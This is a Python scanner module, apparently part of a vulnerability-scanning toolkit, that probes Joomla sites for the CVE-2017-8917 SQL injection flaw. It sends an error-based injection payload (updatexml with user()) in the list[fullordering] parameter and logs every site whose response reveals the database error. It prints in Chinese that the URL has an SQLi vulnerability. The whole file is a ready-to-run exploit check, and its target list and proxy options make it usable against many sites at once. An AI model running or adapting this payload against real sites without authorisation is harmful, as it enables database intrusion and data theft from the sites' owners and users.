#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from libs.public.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2017_8917:
    def run(self,base_url):
        try:
            url = base_url + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            req.encoding = req.apparent_encoding
            if "XPATH" in req.text:
                print(f"[+] URL: {base_url} 存在SQLi漏洞")
                with open("./result/joomlaSqli.txt","a") as w:
                    w.write(f"Url: {base_url}\n")
        except Exception:
            pass

    def main(self, target):
        url = target[0].rstrip('/ ')
        header = target[1]
        proxy = target[2]
        self.ssl = target[3]
        self.timeout = int(target[4])

        req = ReqSet(header=header)
        self.headers = req["header"]
        self.proxy = {"http":proxy,"https":proxy}
        self.run(url)

